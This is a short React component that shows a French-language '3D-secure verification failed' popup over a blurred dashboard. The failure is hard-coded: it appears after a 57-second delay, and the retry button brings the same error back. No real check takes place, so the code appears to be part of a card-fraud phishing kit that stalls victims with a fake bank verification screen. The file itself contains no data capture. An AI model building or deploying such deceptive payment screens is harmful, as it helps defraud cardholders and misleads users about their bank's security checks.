import React, { useState, useEffect } from 'react';
import Head from 'next/head';

const Board = () => {
  const [showError, setShowError] = useState(false);

  useEffect(() => {
    const errorTimeout = setTimeout(() => {
      setShowError(true);
    }, 57000); // DELAY TO SHOW ERROR MESSAGE

    return () => {
      clearTimeout(errorTimeout);
    };
  }, []);

  const retry3DSecure = () => {
    setShowError(false);
    setTimeout(() => {
      setShowError(true);
    }, 100); // Small delay to reset the popup
  };

  return (
    <div>
      <div className={`dashboard-container blurred`}></div>
      <div className="popup show">
        <div className="popup-content d-secure show">
          <h3>Vérificaton 3D-secure</h3>
            <p>La vérification a échoué. Veuillez réessayer.</p>
            <button className='retry-btn' onClick={retry3DSecure}>Réessayer</button>
        </div>
      </div>
    </div>
  );
};

export default Board;